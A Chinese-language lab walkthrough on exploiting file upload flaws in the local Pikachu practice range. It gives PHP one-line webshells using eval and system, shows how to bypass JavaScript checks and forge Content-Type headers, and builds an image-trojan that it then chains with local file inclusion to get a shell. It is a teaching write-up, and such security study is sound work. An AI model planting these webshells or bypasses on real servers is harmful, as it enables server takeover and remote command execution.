# 文件上传漏洞

## 1、文件上传漏洞概述

![image-20210103150856510](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103150856510.png)

```text
不安全的文件上传漏洞概述
文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。
所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：
--验证文件类型、后缀名、大小;
--验证文件的上传方式;
--对文件进行一定复杂的重命名;
--不要暴露文件上传后的路径;
--等等...
你可以通过“Unsafe file upload”对应的测试栏目，来进一步的了解该漏洞。
```

## 2、文件上传漏洞测试流程

![image-20210103150937539](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103150937539.png)

## 3、文件上传漏洞之客户端验证

下面我们来进行实战演练-客户端js验证~

![image-20210103141802325](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103141802325.png)

一句话木马的编写：

```php
<?php eval(@$_POST['bjx']); ?>
```

我们先准备一个shell.php把一句话写入进去。在准备一个这样的文件将后缀名修改为jpg

![image-20210103153149996](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103153149996.png)

接下来，我们回到靶场，先上传php文件看一看。

![image-20210103153345441](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103153345441.png)

这里提示我们上传的文件不符合要求，那么我们来看一下网页源代码，看一下是前端做了限制还是后端的问题。

果然是前端做的限制。这里就是通过js做的限制。

![image-20210103153442287](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103153442287.png)

**1.第一种方法：**

我们看到这里有一个判断，当状态改变就会调用js。

![image-20210103155627907](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103155627907.png)

我们可以直接把判断删除~

![image-20210103155805170](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103155805170.png)

接下来上传php文件。

![image-20210103161056630](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103161056630.png)

上传成功！连接测试成功！

![image-20210103161726645](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103161726645.png)

当然也可以编写这个一句话：

```text
<?php system($_GET['x']); ?>
```

这样上传成功后，就可以访问URL并且执行命令~

```text
http://127.0.0.1/pikachu/vul/unsafeupload/uploads/shell.php?x=ifconfig
```

![image-20210103162048716](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103162048716.png)

其他方法就不做具体介绍了~还有两种哦~

## 4、文件上传漏洞之MIME类型验证

![image-20210103162257711](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103162257711.png)

PHP中的`$_FILES()`函数是用来处理客户端向服务器端上传文件的。它包含

```text
$_FILES['file']['name']  #文件名
$_FILES['file']['type']  # 文件类型
$_FILES['file']['size']  # 文件大小，单位为字节
$_FILES['file']['tmp_name'] # 存储在服务器的文件临时副本的名称
$_FILES['file']['error'] # 文件上传的错误代码
```

![image-20210103163658460](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103163658460.png)

其中`$_FILES['file']['type']`就是从我们前面说的地方取值，而http请求content-type用户可控，所以可以绕过。

抓包上传请求，修改content-type字段文件类型为允许的类型即可。

下面我们就去靶场里面进行实战演练。我们随便上传一个shell.php尝试一下。

![image-20210103164010208](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103164010208.png)

好吧，不能上传~按照正常的思路，我们先看一下源代码吧~

![image-20210103164510459](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103164510459.png)

![image-20210103164532041](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103164532041.png)

这里是通过全局的函数来获取文件的类型。

下面我们来进行上传绕过~打开shell.php然后用burp抓包，修改为Content-Type：image/png;

![image-20210103170117295](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103170117295.png)

提交之后，我们可以看到上传成功。

![image-20210103165952655](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103165952655.png)

## 5、文件上传漏洞之getimagesize\(\)类型验证

getimagesize\(\)这个函数是php提供用来判断目标是不是一个图片的函数。

这是PHP判断图片文件大小和文件类型的函数，它以16进制读取文件，从16进制的前几位判断文件类型，如文件开头是8950 4e47是png格式的开头。这个开头也就是我们一般所说的文件幻数。绕过get\_imagesize\(\)函数可以通过制作图片马绕过（windows下可以通过命令形如`copy /b pic.png + shell.php picshell.png`来制作图片马）。也可以在木马文件头部直接加上头部如GIF98A。

这个时候就有一个问题，如果上传的文件是图片，那插入的恶意代码怎么执行呢？直接访问后缀为png格式的文件返回就是图片。这个时候可以结合文件包含的组合拳来解析恶意代码。上传图片马拿到上传位置后，结合前面说到的文件包含漏洞即可验证此部分漏洞。

![image-20210103174218370](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103174218370.png)

在linux中我们可以使用xxd命令查看文件的16进制

![image-20210103175857029](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103175857029.png)

8950 4e47是png格式的开头

图片木马的制作：

![image-20210103181026498](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103181026498.png)

下面我们来制作图片木马：准备一个背景图片pic.jpg一个一句话木马shell.php合成图片马picshell.jpg

![image-20210103174934283](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103174934283.png)

下面我们来到靶场，选择制作好的图片马，上传

![image-20210103175136185](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103175136185.png)

下面我们打开文件路径看一看

![image-20210103175234151](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103175234151.png)

由于是以图片格式打开的，所以无法直接利用，可以通过文件包含，getshell 观察图片木马成功上传的路径和本地文件包含的路径，可以得出包含图片木马的路径，进而getshell

```text
http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/01/03/7809165ff19385ef35e274751323.jpg&submit=提交查询
```

![image-20210103175522223](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103175522223.png)

下面我们用蚁剑连接。

![image-20210103175652446](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103175652446.png)

![image-20210103175632313](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103175632313.png)

## 6、文件上传漏洞-防范措施

![image-20210103181511679](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210103181511679.png)

